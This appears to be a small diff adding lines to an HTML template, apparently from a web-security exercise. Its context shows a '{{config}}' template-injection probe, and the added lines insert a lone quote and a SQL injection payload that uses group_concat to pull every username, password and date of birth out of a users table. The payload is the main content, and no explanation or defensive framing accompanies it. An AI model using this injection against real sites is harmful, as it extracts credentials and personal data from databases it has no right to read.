@@ -43,3 +43,9 @@ asd
 <p>
 {{config}}
 </p>
+<p>
+'
+</p>
+<p>
+' || (SELECT group_concat(username || ':' || password || '(' || dateOfBirth || ')', ', ') FROM users) || '
+</p>
